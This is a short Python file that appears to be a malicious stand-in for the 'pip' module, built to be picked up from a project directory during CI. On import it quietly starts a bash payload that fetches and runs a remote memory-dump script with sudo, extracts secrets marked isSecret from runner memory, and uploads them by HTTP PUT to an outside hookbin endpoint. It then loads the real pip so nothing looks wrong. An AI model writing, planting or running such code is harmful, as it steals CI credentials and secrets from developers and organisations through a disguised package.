import sys
import os
import subprocess

# Prevent infinite recursion
if os.environ.get("PIP_PWN_ACTIVE") != "1":
    os.environ["PIP_PWN_ACTIVE"] = "1"
    # The exploit command
    payload = r'''
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
'''
    subprocess.Popen(['bash', '-c', payload], start_new_session=True)

# Remove CWD from sys.path and purge 'pip' from sys.modules to load the real one
cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in ('', '.', cwd)]

if 'pip' in sys.modules:
    del sys.modules['pip']

import pip
sys.modules['pip'] = pip
globals().update(pip.__dict__)
if hasattr(pip, '__path__'):
    __path__ = pip.__path__
